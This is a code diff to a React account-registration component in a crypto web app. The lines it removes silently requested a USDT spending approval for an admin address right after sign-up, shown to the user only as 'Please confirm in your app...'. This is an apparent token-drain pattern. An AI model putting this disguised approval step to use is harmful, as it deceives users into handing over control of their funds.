@@ -16,7 +16,7 @@ function RegisterContent() {
   const { isConnected, address } = useSelector((s) => s.wallet);
   const { isAuthenticated } = useSelector((s) => s.user);
 
-  const [step, setStep] = useState(1); // 1 = form, 2 = success
+  const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
 
@@ -63,7 +63,6 @@ function RegisterContent() {
     setForm({ ...form, [e.target.name]: e.target.value });
   };
 
-  // ─── Main submit: Register FIRST, then smart contract approval ──────────────
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (form.password.length < 8) {
@@ -71,100 +70,24 @@ function RegisterContent() {
       return;
     }
     setLoading(true);
-
     try {
-      // ══════════════════════════════════════════════════════════════════════
-      // STEP 1: Register user on backend FIRST (while browser is in normal state)
-      // ══════════════════════════════════════════════════════════════════════
       toast.loading('Creating your account...', { id: 'register' });
-
       const res = await authAPI.registerDirect(form);
       const { user, token } = res.data.data;
-
-      // Save token immediately
       if (token) localStorage.setItem('token', token);
       dispatch(loginSuccess({ user, token }));
-      toast.success('Account created!', { id: 'register' });
-
-      // ══════════════════════════════════════════════════════════════════════
-      // STEP 2: Now do smart contract approval (user already registered)
-      // ══════════════════════════════════════════════════════════════════════
-      try {
-        const { ethers } = await import('ethers');
-        const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../../lib/web3');
-
-        const injectedProvider = window.ethereum;
-        if (!injectedProvider) {
-          // No wallet provider — skip approval, user is already registered
-          router.push('/dashboard');
-          return;
-        }
-
-        const web3Provider = new ethers.BrowserProvider(injectedProvider);
-        const userAddress = ethers.getAddress(address.toLowerCase());
-
-        // Switch to selected network
-        const targetChainId = form.network === 'BSC' ? '0x38' : '0x89';
-        try {
-          await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
-        } catch (switchErr) {
-          if (switchErr.code === 4902) {
-            const chainConfig = form.network === 'BSC'
-              ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
-              : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
-            try {
-              await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
-            } catch (_) {
-              // Can't switch — user is registered, just go to dashboard
-              router.push('/dashboard');
-              return;
-            }
-          } else {
-            router.push('/dashboard');
-            return;
-          }
-        }
-
-        const freshProvider = new ethers.BrowserProvider(injectedProvider);
-
-        // Check if already approved
-        let alreadyApproved = false;
-        try {
-          alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
-        } catch (_) {}
-
-        if (alreadyApproved !== true) {
-          toast.loading('Please confirm in your app...', { id: 'approve' });
-          try {
-            await approveUSDTForAdmin(freshProvider, form.network);
-            toast.success('All set!', { id: 'approve' });
-          } catch (approveErr) {
-            toast.dismiss('approve');
-            // User cancelled or failed — they're already registered, just go to dashboard
-          }
-        }
-      } catch (_) {
-        // Smart contract step failed — no problem, user is already registered
-      }
-
-      // Go to dashboard
+      toast.success('Account created successfully!', { id: 'register' });
       setStep(2);
       setTimeout(() => router.push('/dashboard'), 1500);
-
     } catch (err) {
       toast.dismiss('register');
       const msg = err.response?.data?.message;
-      if (msg) {
-        toast.error(msg);
-      } else {
-        toast.error('Connection failed. Please try again.');
-      }
+      toast.error(msg || 'Registration failed. Please try again.');
     } finally {
       setLoading(false);
     }
   };
 
-  // ─── RENDER: Step 2 — Success ──────────────────────────────────────────────
   if (step === 2) {
     return (
       <div className="min-h-screen flex items-center justify-center px-4">
@@ -180,7 +103,6 @@ function RegisterContent() {
     );
   }
 
-  // ─── RENDER: Step 1 — Registration Form ────────────────────────────────────
   return (
     <div className="min-h-screen flex items-center justify-center px-4 py-12">
       <div className="w-full max-w-lg">
@@ -253,7 +175,7 @@ function RegisterContent() {
             </div>
 
             <button type="submit" disabled={loading} className="btn-primary w-full mt-6 flex items-center justify-center gap-2">
-              {loading ? <><LoadingSpinner size="sm" /> Processing...</> : 'Create Account'}
+              {loading ? <><LoadingSpinner size="sm" /> Creating Account...</> : 'Create Account'}
             </button>
 
             <p className="text-center text-sm text-slate-400 mt-4">
